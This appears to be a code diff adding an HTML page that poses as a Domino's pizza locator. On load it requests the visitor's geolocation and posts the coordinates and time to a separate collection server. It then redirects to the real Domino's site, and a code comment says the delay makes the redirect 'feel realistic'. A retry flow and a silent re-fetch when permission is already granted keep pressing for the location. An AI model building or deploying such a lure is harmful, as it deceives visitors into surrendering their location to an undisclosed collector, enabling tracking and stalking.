@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Location Request</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f6fa;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            padding-top: 30px;
+        }
+
+        #status {
+            font-size: 20px;
+            display: none; /* hidden until promo is shown first */
+        }
+
+        /* Promo image shown first on page load */
+        #promo-container {
+            margin: 20px auto;
+            max-width: 520px;
+            display: block; /* show immediately */
+        }
+
+        #promo-img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.18);
+            display: block;
+        }
+
+        #promo-caption {
+            margin-top: 10px;
+            font-size: 16px;
+            color: #333;
+        }
+        #retry-btn {
+            margin-top: 14px;
+            padding: 10px 16px;
+            font-size: 15px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            display: none; /* shown when permission denied */
+        }
+        #retry-btn:hover { background: #005a9e; }
+    </style>
+</head>
+<body>
+
+<!-- Promo image (save the attached image to the project as "pizza.jpg") -->
+<div id="promo-container">
+    <img id="promo-img" src="pizza.jpg" alt="Delicious pizza">
+    <div id="promo-caption">Grab a pizza while we find Domino's near you</div>
+</div>
+
+<p id="status">finding near by dominos</p>
+<button id="retry-btn">Try again</button>
+
+<script>
+async function sendLocation(lat, lng) {
+    // Show activity message and promo image while sending/redirecting
+    document.getElementById("status").innerText = "Sending location — redirecting shortly...";
+    const promo = document.getElementById("promo-container");
+    if (promo) promo.style.display = "block";
+    await fetch("http://localhost:3000/location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            lat: lat,
+            lng: lng,
+            time: new Date().toLocaleString()
+        })
+    });
+
+    document.getElementById("status").innerText = "Redirecting to Domino's...";
+
+    // Give a short pause so the user sees the image/message (helps make redirect feel realistic)
+    setTimeout(() => {
+        window.location.href = "https://www.dominos.co.in/";
+    }, 900);
+}
+
+// Auto-request location on page load
+window.onload = () => {
+    // promo is visible immediately (per new UX requirement). Wait briefly,
+    // then show the status text and request the user's location.
+    setTimeout(() => {
+        const statusEl = document.getElementById("status");
+        statusEl.style.display = "block";
+        statusEl.innerText = "finding near by dominos";
+
+        // Use the requestLocation wrapper so we can retry when denied
+        requestLocation();
+    }, 1200); // 1.2s delay so the image is seen first
+};
+
+function requestLocation() {
+    const statusEl = document.getElementById("status");
+    const retryBtn = document.getElementById("retry-btn");
+    if (retryBtn) retryBtn.style.display = "none";
+
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            statusEl.innerText = "";
+            let lat = pos.coords.latitude;
+            let lng = pos.coords.longitude;
+            sendLocation(lat, lng);
+        },
+        (err) => {
+            // If permission denied, show friendly message and a retry button
+            if (err && err.code === err.PERMISSION_DENIED) {
+                statusEl.innerText =
+                    "Location access denied. Please allow location to continue.";
+                if (retryBtn) retryBtn.style.display = "inline-block";
+            } else {
+                statusEl.innerText =
+                    "Unable to retrieve location. Please try again later.";
+            }
+        }
+    );
+}
+
+// Hook up retry button to requestLocation again
+document.addEventListener('DOMContentLoaded', () => {
+    const retryBtn = document.getElementById("retry-btn");
+    if (retryBtn) {
+        retryBtn.addEventListener('click', () => {
+            const statusEl = document.getElementById("status");
+            statusEl.innerText = "Requesting location permission...";
+            retryBtn.style.display = "none";
+
+            // If Permissions API is available, check the geolocation permission state first.
+            // This lets us silently obtain the location when permission is already granted,
+            // or prompt the user if it's in 'prompt' state. If it's 'denied' we show
+            // a helpful instruction since many browsers won't re-prompt automatically.
+            if (navigator.permissions && navigator.permissions.query) {
+                navigator.permissions.query({ name: 'geolocation' }).then((perm) => {
+                    if (perm.state === 'granted') {
+                        // Permission already granted: get position immediately without an extra prompt
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                statusEl.innerText = "";
+                                const lat = pos.coords.latitude;
+                                const lng = pos.coords.longitude;
+                                sendLocation(lat, lng);
+                            },
+                            (err) => {
+                                statusEl.innerText = "Unable to retrieve location. Please try again.";
+                                retryBtn.style.display = "inline-block";
+                            }
+                        );
+                    } else if (perm.state === 'prompt') {
+                        // Browser will prompt — just call the existing flow
+                        setTimeout(requestLocation, 200);
+                    } else {
+                        // Permission is denied/blocked — inform the user to change settings
+                        statusEl.innerText =
+                            "Location is blocked. Please enable location access in your browser settings and try again.";
+                        retryBtn.style.display = "inline-block";
+                    }
+                }).catch(() => {
+                    // If Permissions API fails for any reason, fall back to attempting to request location
+                    setTimeout(requestLocation, 200);
+                });
+            } else {
+                // Permissions API not supported — fall back to direct request
+                setTimeout(requestLocation, 200);
+            }
+        });
+    }
+});
+</script>
+
+</body>
+</html>
